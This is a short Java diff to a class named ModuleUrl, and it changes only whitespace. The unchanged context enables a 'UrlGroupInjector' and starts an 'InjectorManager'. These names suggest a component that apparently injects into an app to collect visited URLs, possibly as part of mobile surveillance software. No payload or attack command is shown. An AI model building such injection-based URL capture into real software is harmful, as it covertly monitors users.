@@ -49,7 +49,6 @@ public final class ModuleUrl extends BaseModule {
 
     protected boolean parse(ConfModule conf) {
 
-
         setPeriod(NEVER);
         setDelay(SOON);
         return true;
@@ -66,12 +65,12 @@ public final class ModuleUrl extends BaseModule {
 
         UrlGroupInjector.enableGroup(true);
         UiApplication.getUiApplication().invokeAndWait(new Runnable() {
-            
+
             public void run() {
                 InjectorManager.getInstance().start();
             }
         });
-        
+
     }
 
     public synchronized void actualStop() {
